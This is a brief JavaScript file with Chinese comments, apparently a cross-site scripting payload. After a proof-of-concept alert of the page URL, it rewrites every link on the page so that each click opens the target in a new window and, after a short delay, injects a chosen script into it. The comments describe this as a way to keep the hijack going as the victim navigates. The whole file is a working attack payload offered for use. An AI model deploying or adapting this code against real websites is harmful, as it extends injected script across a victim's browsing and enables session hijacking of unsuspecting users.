//添加希望执行的JS
alert(document.location.href);
//如果希望继续劫持下去,可以添加下面的JS代码，否则删除下面的代码
//Insert js into obj
function script2obj(window_obj,src){
	s=window_obj.document.createElement('script');
	s.src=src;
	window_obj.document.getElementsByTagName('body')[0].appendChild(s);
}
/*hijack function
Desc:Hijack all links in the page
parameters:
js:The js which you want to add the event*/
function hijack_links(js){
  for(i=0;i<document.links.length;i++)
  {
  	  document.links[i].onclick=function(){
  		x=window.open(this.href);//get the object which open the new window
  		setTimeout("script2obj(x,'"+js+"')",2000); 
  		//delay 2 sec for waitting for the dom complete,and then inject the js.
  	  return false;
  	}
  }
}
hijack_links('alert.js');